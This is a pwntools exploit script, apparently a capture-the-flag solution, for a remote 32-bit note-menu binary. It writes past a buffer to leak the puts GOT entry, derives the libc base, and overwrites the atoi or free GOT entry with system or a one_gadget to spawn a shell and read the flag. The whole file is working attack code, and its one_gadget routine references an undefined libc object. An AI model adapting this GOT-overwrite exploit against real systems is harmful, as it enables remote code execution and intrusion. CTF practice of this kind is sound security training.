from pwn import * 

#p = process("./chall")
p = remote("not.codepwnda.id", 17667)
binary = ELF("chall")
# libc = ELF("libc-2.27.so", checksec = False)
puts_got = binary.got['puts']
free_got = binary.got['free']
atoi_got = binary.got['atoi']

def create():
    p.sendlineafter("> ", "1")

def read(idx):
    p.sendlineafter("> ", "2")
    p.sendlineafter("index: ", str(idx))
    p.recvuntil("content: ")
    return p.recv(4)

def write(idx, text):
    p.sendlineafter("> ", "3")
    p.sendlineafter("index: ", str(idx))
    p.sendlineafter("Your input: ", text)

def delete(idx):
    p.sendlineafter("> ", "4")
    p.sendlineafter("index: ", str(idx))

def one_gadget():
    create()
    create()
    write(0, "A" * 64 + p32(puts_got))
    
    libc_leak = u32(read(1))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc.address = libc_leak - 0x067b40
    log.info("Libc leak : {}".format(hex(libc.address)))
    libc_system = libc.symbols['system']
    log.info("Libc system : {}".format(hex(libc_system)))
    one_gadget = libc.address + 0x3d0d3
    log.info("One gadget address : {}".format(hex(one_gadget)))

    write(0, 'A' * 64 + p32(free_got))
    write(1, p32(one_gadget))

    # gdb.attach(p, "start")
    
    delete(0)
    
    sleep(1)
    p.sendline("ls -la && cat flag")

    p.interactive()

def GOT_overwrite():
    create()
    create()
    write(0, "A" * 64 + p32(puts_got))
    
    libc_leak = u32(read(1))
    log.info("Libc leak : {}".format(hex(libc_leak)))
    libc_base = libc_leak - 0x05f140
    log.info("Libc leak : {}".format(hex(libc_base)))
    libc_system = libc_base + 0x03a940
    log.info("Libc system : {}".format(hex(libc_system)))

    write(0, 'A' * 64 + p32(atoi_got))
    write(1, p32(libc_system))

    # gdb.attach(p, "start")
    
    p.sendline("/bin/sh\x00")
    # sleep(1)
    # p.sendline("ls -la && cat flag")

    p.interactive()

if __name__ == "__main__":
    GOT_overwrite()
    # one_gadget()
